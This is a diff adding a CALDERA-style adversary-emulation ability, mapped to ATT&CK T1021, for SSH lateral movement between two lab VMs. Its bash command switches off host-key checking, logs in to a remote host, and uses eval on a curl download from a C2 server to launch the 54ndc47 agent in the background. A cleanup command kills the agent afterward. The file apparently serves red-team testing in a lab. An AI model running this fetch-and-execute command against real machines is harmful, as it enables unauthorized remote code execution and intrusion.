@@ -1,0 +1,15 @@
+---
+- id: 7369d2b0-88b4-48e3-b837-1ad0dbf0f02f
+  name: SSH lateral movement lab-vm1 to lab-vm2
+  description: use ssh execute the 54ndc47 download harness on a remote machine
+  tactic: lateral-movement
+  technique:
+    attack_id: T1021
+    name: Remote Services
+  executors:
+    bash:
+      command: |
+        ssh -oStrictHostKeyChecking=no  -f bob@192.168.20.12 'eval nohup "$(curl --noproxy localhost -sk -X POST -H "file:54ndc47.sh" https://192.168.20.1:8888/file/render?group=lab)" < /dev/null > /dev/null 2>&1 &'
+      cleanup: |
+        ssh -oStrictHostKeyChecking=no  -f bob@192.168.20.12 "ps -ax | grep 54ndc47.sh | grep -v 'grep' | awk '{print \$1}' | xargs kill -9"
+
